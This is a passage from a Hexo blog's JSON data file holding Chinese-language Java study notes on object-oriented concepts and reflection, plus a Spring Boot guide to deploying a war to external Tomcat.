方法<br>\nstatic: 类方法，可通过类名直接调用<br>\nabstract: 抽象方法，没有方法体<br>\nfinal: 方法不能被重写<br>\nnative: 集成其它语言的代码<br>\nsynchronized: 控制多个并发线程的访问<br>\n方法声明包括方法名、返回类型和外部参数。其中参数的类型可以是简单数据类型，也可以是复合数据类型（又称引用数据类型）。<br>\n对于简单数据类型来说，java实现的是值传递，方法接收参数的值，但不能改变这些参数的值。如果要改变参数的值，则用引用数据类型，因为引用数据类型传递给方法的是数据在内存中的地址，方法中对数据的操作可以改变数据的值。<br>\n\t方法体<br>\n\t方法体是对方法的实现，它包括局部变量的声明以及所有合法的Java指令。方法体中声明的局部变量的作用域在该方法内部。若局部变量与类的成员变量同名，则类的成员变量被隐藏。<br>\n\t为了区别参数和类的成员变量，我们必须使用this。this用在一个方法中引用当前对象，它的值是调用该方法的对象。返回值须与返回类型一致，或者完全相同，或是其子类。当返回类型是接口时，返回值必须实现该接口。<br>\n\n> 构造方法<br>\n构造方法是一个特殊的方法。Java 中的每个类都有构造方法，用来初始化该类的一个对象。<br>\n构造方法具有和类名相同的名称，而且不返回任何数据类型。<br>\n重载经常用于构造方法。<br>\n构造方法只能由new运算符调用<br>\n<!-- more -->\n\n#### 2.java面向对象三大特点\n###### 封装<br>\n封装性就是尽可能的隐藏对象内部细节，对外形成一道边界，只保留有限的接口和方法与外界进行交互。封装的原则是使对象以外的部分不能随意的访问和操作对象的内部属性，从而避免了外界对对象内部属性的破坏。<br>\n可以通过对类的成员设置一定的访问权限，实现类中成员的信息隐藏。private/public<br>\n\n###### 继承extends\n子类的对象拥有父类的全部属性与方法，称作子类对父类的继承。<br>\nJava中父类可以拥有多个子类，但是子类只能继承一个父类，称为单继承。<br>\n继承实现了代码的复用。<br>\nJava中所有的类都是通过直接或间接地继承java.lang.Object类得到的。<br>\n子类不能继承父类中访问权限为private的成员变量和方法。<br>\n子类可以重写父类的方法，即命名与父类同名的成员变量。<br>\nJava中通过super来实现对父类成员的访问，super用来引用当前对象的父类。\n\n###### 多态\n对象的多态性是指在父类中定义的属性或方法被子类继承之后，可以具有不同的数据类型或表现出不同的行为。这使得同一个属性或方法在父类及其各个子类中具有不同的语义。<br>\n其实就是重载和重写.<br>\n\n  >重载<br>\n\t方法重载是让类以统一的方式处理不同数据类型的手段。\n\t一个类中可以创建多个方法，它们具有相同的名字，但具有不同的参数和不同的定义。调用方法时通过传递给它们的不同参数个数和参数类型来决定具体使用哪个方法。\n\t返回值类型可以相同也可以不相同，无法以返回型别作为重载函数的区分标准。<br>\n  重写<br>\n\t子类对父类的方法进行重新编写。如果在子类中的方法与其父类有相同的的方法名、返回类型和参数表，我们说该方法被重写 (Overriding)。\n\t如需父类中原有的方法，可使用super关键字，该关键字引用了当前类的父类。\n\t子类函数的访问修饰权限不能低于父类的\n","source":"_posts/java/java面向对象.md","raw":"---\ntitle: OJT012\ndate: 2018-09-21 16:09:38\ntags: [java]\n---\n\n#### 1.java面向对象\n###### 面向对象（Object Oriented）<br>\n其基本思想是使用对象、类、继承、封装、多态等基本概念来进行程序设计.\n从现实世界中客观存在的事物（即对象）出发来构造软件系统，并且在系统构造中尽可能运用人类的自然思维方式\n\n###### 对象<br>\n对象是系统中用来描述客观事物的一个实体，它是构成系统的一个基本单位。一个对象由一组属性和对这组属性进行操作的一组服务组成。<br>\n类的实例化可生成对象，一个对象的生命周期包括三个阶段：生成、使用、消除。\n当不存在对一个对象的引用时，该对象成为一个无用对象。Java的垃圾收集器自动扫描对象的动态内存区，\n把没有引用的对象作为垃圾收集起来并释放。当系统内存用尽或调用System.gc( )要求垃圾回收时，垃圾回收线程与系统同步运行。\n\n###### 类<br>\n类是具有相同属性和方法的一组对象的集合，它为属于该类的所有对象提供了统一的抽象描述，其内部包括属性和方法两个主要部分。\n在面向对象的编程语言中，类是一个独立的程序单位，它应该有一个类名并包括属性和方法两个主要部分。<br>\n\n>变量<br>\nstatic: 静态变量/静态方法(类变量/类方法，类层面上)<br>\nfinal: 常量(全局层面上)\n\n> 方法<br>\nstatic: 类方法，可通过类名直接调用<br>\nabstract: 抽象方法，没有方法体<br>\nfinal: 方法不能被重写<br>\nnative: 集成其它语言的代码<br>\nsynchronized: 控制多个并发线程的访问<br>\n方法声明包括方法名、返回类型和外部参数。其中参数的类型可以是简单数据类型，也可以是复合数据类型（又称引用数据类型）。<br>\n对于简单数据类型来说，java实现的是值传递，方法接收参数的值，但不能改变这些参数的值。如果要改变参数的值，则用引用数据类型，因为引用数据类型传递给方法的是数据在内存中的地址，方法中对数据的操作可以改变数据的值。<br>\n\t方法体<br>\n\t方法体是对方法的实现，它包括局部变量的声明以及所有合法的Java指令。方法体中声明的局部变量的作用域在该方法内部。若局部变量与类的成员变量同名，则类的成员变量被隐藏。<br>\n\t为了区别参数和类的成员变量，我们必须使用this。this用在一个方法中引用当前对象，它的值是调用该方法的对象。返回值须与返回类型一致，或者完全相同，或是其子类。当返回类型是接口时，返回值必须实现该接口。<br>\n\n> 构造方法<br>\n构造方法是一个特殊的方法。Java 中的每个类都有构造方法，用来初始化该类的一个对象。<br>\n构造方法具有和类名相同的名称，而且不返回任何数据类型。<br>\n重载经常用于构造方法。<br>\n构造方法只能由new运算符调用<br>\n<!-- more -->\n\n#### 2.java面向对象三大特点\n###### 封装<br>\n封装性就是尽可能的隐藏对象内部细节，对外形成一道边界，只保留有限的接口和方法与外界进行交互。封装的原则是使对象以外的部分不能随意的访问和操作对象的内部属性，从而避免了外界对对象内部属性的破坏。<br>\n可以通过对类的成员设置一定的访问权限，实现类中成员的信息隐藏。private/public<br>\n\n###### 继承extends\n子类的对象拥有父类的全部属性与方法，称作子类对父类的继承。<br>\nJava中父类可以拥有多个子类，但是子类只能继承一个父类，称为单继承。<br>\n继承实现了代码的复用。<br>\nJava中所有的类都是通过直接或间接地继承java.lang.Object类得到的。<br>\n子类不能继承父类中访问权限为private的成员变量和方法。<br>\n子类可以重写父类的方法，即命名与父类同名的成员变量。<br>\nJava中通过super来实现对父类成员的访问，super用来引用当前对象的父类。\n\n###### 多态\n对象的多态性是指在父类中定义的属性或方法被子类继承之后，可以具有不同的数据类型或表现出不同的行为。这使得同一个属性或方法在父类及其各个子类中具有不同的语义。<br>\n其实就是重载和重写.<br>\n\n  >重载<br>\n\t方法重载是让类以统一的方式处理不同数据类型的手段。\n\t一个类中可以创建多个方法，它们具有相同的名字，但具有不同的参数和不同的定义。调用方法时通过传递给它们的不同参数个数和参数类型来决定具体使用哪个方法。\n\t返回值类型可以相同也可以不相同，无法以返回型别作为重载函数的区分标准。<br>\n  重写<br>\n\t子类对父类的方法进行重新编写。如果在子类中的方法与其父类有相同的的方法名、返回类型和参数表，我们说该方法被重写 (Overriding)。\n\t如需父类中原有的方法，可使用super关键字，该关键字引用了当前类的父类。\n\t子类函数的访问修饰权限不能低于父类的\n","slug":"java/java面向对象","published":1,"updated":"2018-09-29T07:10:04.649Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjr64051q000z6cvp12u4jowo","content":"<h4 id=\"1-java面向对象\"><a href=\"#1-java面向对象\" class=\"headerlink\" title=\"1.java面向对象\"></a>1.java面向对象</h4><h6 id=\"面向对象（Object-Oriented）\"><a href=\"#面向对象（Object-Oriented）\" class=\"headerlink\" title=\"面向对象（Object Oriented）\"></a>面向对象（Object Oriented）<br></h6><p>其基本思想是使用对象、类、继承、封装、多态等基本概念来进行程序设计.<br>从现实世界中客观存在的事物（即对象）出发来构造软件系统，并且在系统构造中尽可能运用人类的自然思维方式</p>\n<h6 id=\"对象\"><a href=\"#对象\" class=\"headerlink\" title=\"对象\"></a>对象<br></h6><p>对象是系统中用来描述客观事物的一个实体，它是构成系统的一个基本单位。一个对象由一组属性和对这组属性进行操作的一组服务组成。<br><br>类的实例化可生成对象，一个对象的生命周期包括三个阶段：生成、使用、消除。<br>当不存在对一个对象的引用时，该对象成为一个无用对象。Java的垃圾收集器自动扫描对象的动态内存区，<br>把没有引用的对象作为垃圾收集起来并释放。当系统内存用尽或调用System.gc( )要求垃圾回收时，垃圾回收线程与系统同步运行。</p>\n<h6 id=\"类\"><a href=\"#类\" class=\"headerlink\" title=\"类\"></a>类<br></h6><p>类是具有相同属性和方法的一组对象的集合，它为属于该类的所有对象提供了统一的抽象描述，其内部包括属性和方法两个主要部分。<br>在面向对象的编程语言中，类是一个独立的程序单位，它应该有一个类名并包括属性和方法两个主要部分。<br></p>\n<blockquote>\n<p>变量<br><br>static: 静态变量/静态方法(类变量/类方法，类层面上)<br><br>final: 常量(全局层面上)</p>\n</blockquote>\n<blockquote>\n<p>方法<br><br>static: 类方法，可通过类名直接调用<br><br>abstract: 抽象方法，没有方法体<br><br>final: 方法不能被重写<br><br>native: 集成其它语言的代码<br><br>synchronized: 控制多个并发线程的访问<br><br>方法声明包括方法名、返回类型和外部参数。其中参数的类型可以是简单数据类型，也可以是复合数据类型（又称引用数据类型）。<br><br>对于简单数据类型来说，java实现的是值传递，方法接收参数的值，但不能改变这些参数的值。如果要改变参数的值，则用引用数据类型，因为引用数据类型传递给方法的是数据在内存中的地址，方法中对数据的操作可以改变数据的值。<br><br>    方法体<br><br>    方法体是对方法的实现，它包括局部变量的声明以及所有合法的Java指令。方法体中声明的局部变量的作用域在该方法内部。若局部变量与类的成员变量同名，则类的成员变量被隐藏。<br><br>    为了区别参数和类的成员变量，我们必须使用this。this用在一个方法中引用当前对象，它的值是调用该方法的对象。返回值须与返回类型一致，或者完全相同，或是其子类。当返回类型是接口时，返回值必须实现该接口。<br></p>\n</blockquote>\n<blockquote>\n<p>构造方法<br><br>构造方法是一个特殊的方法。Java 中的每个类都有构造方法，用来初始化该类的一个对象。<br><br>构造方法具有和类名相同的名称，而且不返回任何数据类型。<br><br>重载经常用于构造方法。<br><br>构造方法只能由new运算符调用<br><br><a id=\"more\"></a></p>\n</blockquote>\n<h4 id=\"2-java面向对象三大特点\"><a href=\"#2-java面向对象三大特点\" class=\"headerlink\" title=\"2.java面向对象三大特点\"></a>2.java面向对象三大特点</h4><h6 id=\"封装\"><a href=\"#封装\" class=\"headerlink\" title=\"封装\"></a>封装<br></h6><p>封装性就是尽可能的隐藏对象内部细节，对外形成一道边界，只保留有限的接口和方法与外界进行交互。封装的原则是使对象以外的部分不能随意的访问和操作对象的内部属性，从而避免了外界对对象内部属性的破坏。<br><br>可以通过对类的成员设置一定的访问权限，实现类中成员的信息隐藏。private/public<br></p>\n<h6 id=\"继承extends\"><a href=\"#继承extends\" class=\"headerlink\" title=\"继承extends\"></a>继承extends</h6><p>子类的对象拥有父类的全部属性与方法，称作子类对父类的继承。<br><br>Java中父类可以拥有多个子类，但是子类只能继承一个父类，称为单继承。<br><br>继承实现了代码的复用。<br><br>Java中所有的类都是通过直接或间接地继承java.lang.Object类得到的。<br><br>子类不能继承父类中访问权限为private的成员变量和方法。<br><br>子类可以重写父类的方法，即命名与父类同名的成员变量。<br><br>Java中通过super来实现对父类成员的访问，super用来引用当前对象的父类。</p>\n<h6 id=\"多态\"><a href=\"#多态\" class=\"headerlink\" title=\"多态\"></a>多态</h6><p>对象的多态性是指在父类中定义的属性或方法被子类继承之后，可以具有不同的数据类型或表现出不同的行为。这使得同一个属性或方法在父类及其各个子类中具有不同的语义。<br><br>其实就是重载和重写.<br></p>\n<blockquote>\n<p>重载<br><br>    方法重载是让类以统一的方式处理不同数据类型的手段。<br>    一个类中可以创建多个方法，它们具有相同的名字，但具有不同的参数和不同的定义。调用方法时通过传递给它们的不同参数个数和参数类型来决定具体使用哪个方法。<br>    返回值类型可以相同也可以不相同，无法以返回型别作为重载函数的区分标准。<br><br>  重写<br><br>    子类对父类的方法进行重新编写。如果在子类中的方法与其父类有相同的的方法名、返回类型和参数表，我们说该方法被重写 (Overriding)。<br>    如需父类中原有的方法，可使用super关键字，该关键字引用了当前类的父类。<br>    子类函数的访问修饰权限不能低于父类的</p>\n</blockquote>\n","site":{"data":{}},"excerpt":"<h4 id=\"1-java面向对象\"><a href=\"#1-java面向对象\" class=\"headerlink\" title=\"1.java面向对象\"></a>1.java面向对象</h4><h6 id=\"面向对象（Object-Oriented）\"><a href=\"#面向对象（Object-Oriented）\" class=\"headerlink\" title=\"面向对象（Object Oriented）\"></a>面向对象（Object Oriented）<br></h6><p>其基本思想是使用对象、类、继承、封装、多态等基本概念来进行程序设计.<br>从现实世界中客观存在的事物（即对象）出发来构造软件系统，并且在系统构造中尽可能运用人类的自然思维方式</p>\n<h6 id=\"对象\"><a href=\"#对象\" class=\"headerlink\" title=\"对象\"></a>对象<br></h6><p>对象是系统中用来描述客观事物的一个实体，它是构成系统的一个基本单位。一个对象由一组属性和对这组属性进行操作的一组服务组成。<br><br>类的实例化可生成对象，一个对象的生命周期包括三个阶段：生成、使用、消除。<br>当不存在对一个对象的引用时，该对象成为一个无用对象。Java的垃圾收集器自动扫描对象的动态内存区，<br>把没有引用的对象作为垃圾收集起来并释放。当系统内存用尽或调用System.gc( )要求垃圾回收时，垃圾回收线程与系统同步运行。</p>\n<h6 id=\"类\"><a href=\"#类\" class=\"headerlink\" title=\"类\"></a>类<br></h6><p>类是具有相同属性和方法的一组对象的集合，它为属于该类的所有对象提供了统一的抽象描述，其内部包括属性和方法两个主要部分。<br>在面向对象的编程语言中，类是一个独立的程序单位，它应该有一个类名并包括属性和方法两个主要部分。<br></p>\n<blockquote>\n<p>变量<br><br>static: 静态变量/静态方法(类变量/类方法，类层面上)<br><br>final: 常量(全局层面上)</p>\n</blockquote>\n<blockquote>\n<p>方法<br><br>static: 类方法，可通过类名直接调用<br><br>abstract: 抽象方法，没有方法体<br><br>final: 方法不能被重写<br><br>native: 集成其它语言的代码<br><br>synchronized: 控制多个并发线程的访问<br><br>方法声明包括方法名、返回类型和外部参数。其中参数的类型可以是简单数据类型，也可以是复合数据类型（又称引用数据类型）。<br><br>对于简单数据类型来说，java实现的是值传递，方法接收参数的值，但不能改变这些参数的值。如果要改变参数的值，则用引用数据类型，因为引用数据类型传递给方法的是数据在内存中的地址，方法中对数据的操作可以改变数据的值。<br><br>    方法体<br><br>    方法体是对方法的实现，它包括局部变量的声明以及所有合法的Java指令。方法体中声明的局部变量的作用域在该方法内部。若局部变量与类的成员变量同名，则类的成员变量被隐藏。<br><br>    为了区别参数和类的成员变量，我们必须使用this。this用在一个方法中引用当前对象，它的值是调用该方法的对象。返回值须与返回类型一致，或者完全相同，或是其子类。当返回类型是接口时，返回值必须实现该接口。<br></p>\n</blockquote>\n<blockquote>\n<p>构造方法<br><br>构造方法是一个特殊的方法。Java 中的每个类都有构造方法，用来初始化该类的一个对象。<br><br>构造方法具有和类名相同的名称，而且不返回任何数据类型。<br><br>重载经常用于构造方法。<br><br>构造方法只能由new运算符调用<br><br>","more":"</p>\n</blockquote>\n<h4 id=\"2-java面向对象三大特点\"><a href=\"#2-java面向对象三大特点\" class=\"headerlink\" title=\"2.java面向对象三大特点\"></a>2.java面向对象三大特点</h4><h6 id=\"封装\"><a href=\"#封装\" class=\"headerlink\" title=\"封装\"></a>封装<br></h6><p>封装性就是尽可能的隐藏对象内部细节，对外形成一道边界，只保留有限的接口和方法与外界进行交互。封装的原则是使对象以外的部分不能随意的访问和操作对象的内部属性，从而避免了外界对对象内部属性的破坏。<br><br>可以通过对类的成员设置一定的访问权限，实现类中成员的信息隐藏。private/public<br></p>\n<h6 id=\"继承extends\"><a href=\"#继承extends\" class=\"headerlink\" title=\"继承extends\"></a>继承extends</h6><p>子类的对象拥有父类的全部属性与方法，称作子类对父类的继承。<br><br>Java中父类可以拥有多个子类，但是子类只能继承一个父类，称为单继承。<br><br>继承实现了代码的复用。<br><br>Java中所有的类都是通过直接或间接地继承java.lang.Object类得到的。<br><br>子类不能继承父类中访问权限为private的成员变量和方法。<br><br>子类可以重写父类的方法，即命名与父类同名的成员变量。<br><br>Java中通过super来实现对父类成员的访问，super用来引用当前对象的父类。</p>\n<h6 id=\"多态\"><a href=\"#多态\" class=\"headerlink\" title=\"多态\"></a>多态</h6><p>对象的多态性是指在父类中定义的属性或方法被子类继承之后，可以具有不同的数据类型或表现出不同的行为。这使得同一个属性或方法在父类及其各个子类中具有不同的语义。<br><br>其实就是重载和重写.<br></p>\n<blockquote>\n<p>重载<br><br>    方法重载是让类以统一的方式处理不同数据类型的手段。<br>    一个类中可以创建多个方法，它们具有相同的名字，但具有不同的参数和不同的定义。调用方法时通过传递给它们的不同参数个数和参数类型来决定具体使用哪个方法。<br>    返回值类型可以相同也可以不相同，无法以返回型别作为重载函数的区分标准。<br><br>  重写<br><br>    子类对父类的方法进行重新编写。如果在子类中的方法与其父类有相同的的方法名、返回类型和参数表，我们说该方法被重写 (Overriding)。<br>    如需父类中原有的方法，可使用super关键字，该关键字引用了当前类的父类。<br>    子类函数的访问修饰权限不能低于父类的</p>\n</blockquote>"},{"title":"Java反射","date":"2018-11-07T02:30:33.000Z","_content":"\n详见:https://www.sczyh30.com/posts/Java/java-reflection-1/<br>\nhttps://blog.csdn.net/ljphhj/article/details/12858767\n#### 1.什么是反射\n>Reflection enables Java code to discover information about the fields, methods and constructors of loaded classes, and to use reflected fields, methods, and constructors to operate on their underlying counterparts, within security restrictions.\nThe API accommodates applications that need access to either the public members of a target object (based on its runtime class) or the members declared by a given class. It also allows programs to suppress default reflective access control\n\n反射机制允许运行中的 Java 程序获取自身的信息，并且可以操作类或对象的内部属性。<br>\n反射的核心是 JVM 在运行时才动态加载类或调用方法/访问属性，它不需要事先（写代码的时候或编译期）知道运行对象是谁。<br>\nJava 反射主要提供以下功能：\n- 在运行时判断任意一个对象所属的类；\n- 在运行时构造任意一个类的对象；\n- 在运行时判断任意一个类所具有的成员变量和方法（通过反射甚至可以调用private方法）；\n- 在运行时调用任意一个对象的方法\n\n<strong>在运行时，而不是编译时.</strong>\n","source":"_posts/java/reflect.md","raw":"---\ntitle: Java反射\ndate: 2018-11-07 10:30:33\ntags: [java]\n---\n\n详见:https://www.sczyh30.com/posts/Java/java-reflection-1/<br>\nhttps://blog.csdn.net/ljphhj/article/details/12858767\n#### 1.什么是反射\n>Reflection enables Java code to discover information about the fields, methods and constructors of loaded classes, and to use reflected fields, methods, and constructors to operate on their underlying counterparts, within security restrictions.\nThe API accommodates applications that need access to either the public members of a target object (based on its runtime class) or the members declared by a given class. It also allows programs to suppress default reflective access control\n\n反射机制允许运行中的 Java 程序获取自身的信息，并且可以操作类或对象的内部属性。<br>\n反射的核心是 JVM 在运行时才动态加载类或调用方法/访问属性，它不需要事先（写代码的时候或编译期）知道运行对象是谁。<br>\nJava 反射主要提供以下功能：\n- 在运行时判断任意一个对象所属的类；\n- 在运行时构造任意一个类的对象；\n- 在运行时判断任意一个类所具有的成员变量和方法（通过反射甚至可以调用private方法）；\n- 在运行时调用任意一个对象的方法\n\n<strong>在运行时，而不是编译时.</strong>\n","slug":"java/reflect","published":1,"updated":"2018-11-07T03:14:08.978Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjr64051s00116cvpkrkkf5uo","content":"<p>详见:<a href=\"https://www.sczyh30.com/posts/Java/java-reflection-1/\" target=\"_blank\" rel=\"noopener\">https://www.sczyh30.com/posts/Java/java-reflection-1/</a><br><br><a href=\"https://blog.csdn.net/ljphhj/article/details/12858767\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/ljphhj/article/details/12858767</a></p>\n<h4 id=\"1-什么是反射\"><a href=\"#1-什么是反射\" class=\"headerlink\" title=\"1.什么是反射\"></a>1.什么是反射</h4><blockquote>\n<p>Reflection enables Java code to discover information about the fields, methods and constructors of loaded classes, and to use reflected fields, methods, and constructors to operate on their underlying counterparts, within security restrictions.<br>The API accommodates applications that need access to either the public members of a target object (based on its runtime class) or the members declared by a given class. It also allows programs to suppress default reflective access control</p>\n</blockquote>\n<p>反射机制允许运行中的 Java 程序获取自身的信息，并且可以操作类或对象的内部属性。<br><br>反射的核心是 JVM 在运行时才动态加载类或调用方法/访问属性，它不需要事先（写代码的时候或编译期）知道运行对象是谁。<br><br>Java 反射主要提供以下功能：</p>\n<ul>\n<li>在运行时判断任意一个对象所属的类；</li>\n<li>在运行时构造任意一个类的对象；</li>\n<li>在运行时判断任意一个类所具有的成员变量和方法（通过反射甚至可以调用private方法）；</li>\n<li>在运行时调用任意一个对象的方法</li>\n</ul>\n<p><strong>在运行时，而不是编译时.</strong></p>\n","site":{"data":{}},"excerpt":"","more":"<p>详见:<a href=\"https://www.sczyh30.com/posts/Java/java-reflection-1/\" target=\"_blank\" rel=\"noopener\">https://www.sczyh30.com/posts/Java/java-reflection-1/</a><br><br><a href=\"https://blog.csdn.net/ljphhj/article/details/12858767\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/ljphhj/article/details/12858767</a></p>\n<h4 id=\"1-什么是反射\"><a href=\"#1-什么是反射\" class=\"headerlink\" title=\"1.什么是反射\"></a>1.什么是反射</h4><blockquote>\n<p>Reflection enables Java code to discover information about the fields, methods and constructors of loaded classes, and to use reflected fields, methods, and constructors to operate on their underlying counterparts, within security restrictions.<br>The API accommodates applications that need access to either the public members of a target object (based on its runtime class) or the members declared by a given class. It also allows programs to suppress default reflective access control</p>\n</blockquote>\n<p>反射机制允许运行中的 Java 程序获取自身的信息，并且可以操作类或对象的内部属性。<br><br>反射的核心是 JVM 在运行时才动态加载类或调用方法/访问属性，它不需要事先（写代码的时候或编译期）知道运行对象是谁。<br><br>Java 反射主要提供以下功能：</p>\n<ul>\n<li>在运行时判断任意一个对象所属的类；</li>\n<li>在运行时构造任意一个类的对象；</li>\n<li>在运行时判断任意一个类所具有的成员变量和方法（通过反射甚至可以调用private方法）；</li>\n<li>在运行时调用任意一个对象的方法</li>\n</ul>\n<p><strong>在运行时，而不是编译时.</strong></p>\n"},{"title":"spring_tomcat","date":"2018-10-17T07:14:40.000Z","_content":"#### Springboot部署war包到服务器上\n\n1.修改打包方式为war\n```\n<groupId>com.xcloud</groupId>\n   <artifactId>import-xcloud</artifactId>\n   <version>0.0.1-SNAPSHOT</version>\n   <packaging>war</packaging>\n```\n\n2.移除内置tomcat，引入外部的\n```\n<dependency>\n            <groupId>org.springframework.boot</groupId>\n            <artifactId>spring-boot-starter-web</artifactId>\n            <!--使用外部tomcat时放开-->\n            <exclusions>\n                <exclusion>\n                    <groupId>org.springframework.boot</groupId>\n                    <artifactId>spring-boot-starter-tomcat</artifactId>\n                </exclusion>\n            </exclusions>\n        </dependency>\n        <!--下面的两个dependency都是用来部署到外置tomcat时使用，就是去掉内置的tomcat-->\n        <dependency>\n            <groupId>org.springframework.boot</groupId>\n            <artifactId>spring-boot-starter-tomcat</artifactId>\n            <scope>provided</scope>\n        </dependency>\n        <dependency>\n            <groupId>javax.servlet</groupId>\n            <artifactId>servlet-api</artifactId>\n            <version>3.0-alpha-1</version>\n            <scope>provided</scope>\n        </dependency>\n```\n3.修改启动类，继承extends SpringBootServletInitializer\n```\n@SpringBootApplication\npublic class ImportXcloudApplication extends SpringBootServletInitializer {\n\n    public static void main(String[] args) {\n        SpringApplication.run(ImportXcloudApplication.class, args);\n    }\n\n    //返回启动类builder\n    @Override\n    protected SpringApplicationBuilder configure(SpringApplicationBuilder builder) {\n        return builder.sources(ImportXcloudApplication.class);\n    }\n}\n```\n","source":"_posts/java/spring-tomcat.md","raw":"---\ntitle: spring_tomcat\ndate: 2018-10-17 15:14:40\ntags: [springboot, tomcat,java]\n---\n#### Springboot部署war包到服务器上\n\n1.修改打包方式为war\n```\n<groupId>com.xcloud</groupId>\n   <artifactId>import-xcloud</artifactId>\n   <version>0.0.1-SNAPSHOT</version>\n   <packaging>war</packaging>\n```\n\n2.移除内置tomcat，引入外部的\n```\n<dependency>\n            <groupId>org.springframework.boot</groupId>\n            <artifactId>spring-boot-starter-web</artifactId>\n            <!--使用外部tomcat时放开-->\n            <exclusions>\n                <exclusion>\n                    <groupId>org.springframework.boot</groupId>\n                    <artifactId>spring-boot-starter-tomcat</artifactId>\n                </exclusion>\n            </exclusions>\n        </dependency>\n        <!--下面的两个dependency都是用来部署到外置tomcat时使用，就是去掉内置的tomcat-->\n        <dependency>\n            <groupId>org.springframework.boot</groupId>\n            <artifactId>spring-boot-starter-tomcat</artifactId>\n            <scope>provided</scope>\n        </dependency>\n        <dependency>\n            <groupId>javax.servlet</groupId>\n            <artifactId>servlet-api</artifactId>\n            <version>3.0-alpha-1</version>\n            <scope>provided</scope>\n        </dependency>\n```\n3.修改启动类，继承extends SpringBootServletInitializer\n```\n@SpringBootApplication\npublic class ImportXcloudApplication extends SpringBootServletInitializer {\n\n    public static void main(String[] args) {\n        SpringApplication.run(ImportXcloudApplication.class, args);\n    }\n\n    //返回启动类builder\n    @Override\n    protected SpringApplicationBuilder configure(SpringApplicationBuilder builder) {\n        return builder.sources(ImportXcloudApplication.class);\n    }\n}\n```\n","slug":"java/spring-tomcat","published":1,"updated":"2019-01-21T09:07:35.089Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjr64051u00136cvphm6eaktu","content":"<h4 id=\"Springboot部署war包到服务器上\"><a href=\"#Springboot部署war包到服务器上\" class=\"headerlink\" title=\"Springboot部署war包到服务器上\"></a>Springboot部署war包到服务器上</h4><p>1.修改打包方式为war<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;groupId&gt;com.xcloud&lt;/groupId&gt;</span><br><span class=\"line\">   &lt;artifactId&gt;import-xcloud&lt;/artifactId&gt;</span><br><span class=\"line\">   &lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt;</span><br><span class=\"line\">   &lt;packaging&gt;war&lt;/packaging&gt;</span><br></pre></td></tr></table></figure></p>\n<p>2.移除内置tomcat，引入外部的<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;dependency&gt;</span><br><span class=\"line\">            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class=\"line\">            &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;</span><br><span class=\"line\">            &lt;!--使用外部tomcat时放开--&gt;</span><br><span class=\"line\">            &lt;exclusions&gt;</span><br><span class=\"line\">                &lt;exclusion&gt;</span><br><span class=\"line\">                    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class=\"line\">                    &lt;artifactId&gt;spring-boot-starter-tomcat&lt;/artifactId&gt;</span><br><span class=\"line\">                &lt;/exclusion&gt;</span><br><span class=\"line\">            &lt;/exclusions&gt;</span><br><span class=\"line\">        &lt;/dependency&gt;</span><br><span class=\"line\">        &lt;!--下面的两个dependency都是用来部署到外置tomcat时使用，就是去掉内置的tomcat--&gt;</span><br><span class=\"line\">        &lt;dependency&gt;</span><br><span class=\"line\">            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class=\"line\">            &lt;artifactId&gt;spring-boot-starter-tomcat&lt;/artifactId&gt;</span><br><span class=\"line\">            &lt;scope&gt;provided&lt;/scope&gt;</span><br><span class=\"line\">        &lt;/dependency&gt;</span><br><span class=\"line\">        &lt;dependency&gt;</span><br><span class=\"line\">            &lt;groupId&gt;javax.servlet&lt;/groupId&gt;</span><br><span class=\"line\">            &lt;artifactId&gt;servlet-api&lt;/artifactId&gt;</span><br><span class=\"line\">            &lt;version&gt;3.0-alpha-1&lt;/version&gt;</span><br><span class=\"line\">            &lt;scope&gt;provided&lt;/scope&gt;</span><br><span class=\"line\">        &lt;/dependency&gt;</span><br></pre></td></tr></table></figure></p>\n<p>3.修改启动类，继承extends SpringBootServletInitializer<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@SpringBootApplication</span><br><span class=\"line\">public class ImportXcloudApplication extends SpringBootServletInitializer &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    public static void main(String[] args) &#123;</span><br><span class=\"line\">        SpringApplication.run(ImportXcloudApplication.class, args);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    //返回启动类builder</span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    protected SpringApplicationBuilder configure(SpringApplicationBuilder builder) &#123;</span><br><span class=\"line\">        return builder.sources(ImportXcloudApplication.class);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n","site":{"data":{}},"excerpt":"","more":"<h4 id=\"Springboot部署war包到服务器上\"><a href=\"#Springboot部署war包到服务器上\" class=\"headerlink\" 